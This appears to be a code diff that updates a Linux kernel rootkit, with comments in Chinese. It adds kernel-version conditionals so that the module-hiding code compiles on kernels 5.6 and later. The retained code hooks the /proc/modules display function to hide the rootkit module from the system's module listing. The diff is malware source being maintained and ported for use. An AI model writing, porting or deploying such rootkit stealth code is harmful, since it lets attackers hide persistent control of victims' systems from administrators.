@@ -1,0 +1,110 @@
+--- a/rootkit.h
++++ b/rootkit.h
+@@ -33,7 +33,6 @@
+ #include <linux/sched.h>
+ #include <linux/pid.h>
+-#include <linux/dirent.h>
+ #include <linux/socket.h>
+ #include <linux/in.h>
+ #include <net/tcp.h>
+@@ -39,6 +38,11 @@
+ #include <net/sock.h>
+ 
++// 条件包含dirent.h以避免重复定义
++#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
++#include <linux/dirent.h>
++#endif
++
+ // 通用定义
+ #define MODULE_NAME "rootkit"
+ 
+@@ -75,6 +79,8 @@
+ 
+ // 通用数据结构
++// 只在内核版本小于5.6时定义linux_dirent64结构体
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+ struct linux_dirent64 {
+     u64 d_ino;
+     s64 d_off;
+@@ -82,6 +88,7 @@
+     unsigned char d_type;
+     char d_name[];
+ };
++#endif
+ 
+ struct linux_dirent {
+     unsigned long d_ino;
+
+--- a/module_hiding.c
++++ b/module_hiding.c
+@@ -9,7 +9,9 @@
+ extern struct list_head *module_previous;
+ extern short module_hidden;
+-extern struct module *THIS_MODULE;
++// THIS_MODULE已在内核头文件中定义，无需重复声明
+ 
+-// 原始函数指针
++// 原始函数指针（仅在旧内核版本中使用）
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+ static int (*original_proc_modules_show)(struct seq_file *m, void *v);
+ static struct file_operations *original_proc_modules_fops;
++#endif
+ 
+ // 模块隐藏相关函数
+ static int is_hidden_module(const char *name);
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+ static int hooked_proc_modules_show(struct seq_file *m, void *v);
++#endif
+ static void hide_from_proc_modules(void);
+ static void restore_proc_modules(void);
+@@ -48,7 +52,8 @@
+ }
+ 
+-// Hook /proc/modules 显示函数
++// Hook /proc/modules 显示函数（仅在旧内核版本中使用）
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+ static int hooked_proc_modules_show(struct seq_file *m, void *v) {
+     struct module *mod = list_entry(v, struct module, list);
+ 
+@@ -60,6 +65,7 @@
+     return original_proc_modules_show(m, v);
+ }
++#endif
+ 
+ // 从 /proc/modules 中隐藏
+ static void hide_from_proc_modules(void) {
+@@ -63,7 +69,8 @@
+ // 从 /proc/modules 中隐藏
+ static void hide_from_proc_modules(void) {
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+     struct proc_dir_entry *proc_modules;
+     
+-    // 查找 /proc/modules 条目
++    // 在较老的内核版本中使用proc_find_entry
+     proc_modules = proc_find_entry("modules", NULL);
+     if (!proc_modules) {
+         printk(KERN_ERR "[rootkit] Failed to find /proc/modules\n");
+@@ -79,6 +86,11 @@
+     
+     printk(KERN_INFO "[rootkit] Hooked /proc/modules\n");
++#else
++    // 在较新的内核版本中，proc_find_entry不再导出
++    // 使用替代方法或跳过此功能
++    printk(KERN_WARNING "[rootkit] /proc/modules hooking not supported in this kernel version\n");
++#endif
+ }
+ 
+ // 恢复 /proc/modules
+ static void restore_proc_modules(void) {
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+     struct proc_dir_entry *proc_modules;
+     
+     proc_modules = proc_find_entry("modules", NULL);
+@@ -100,6 +112,10 @@
+         printk(KERN_INFO "[rootkit] Restored /proc/modules\n");
+     }
++#else
++    // 在较新的内核版本中无需恢复
++    printk(KERN_INFO "[rootkit] /proc/modules restore not needed in this kernel version\n");
++#endif
+ }
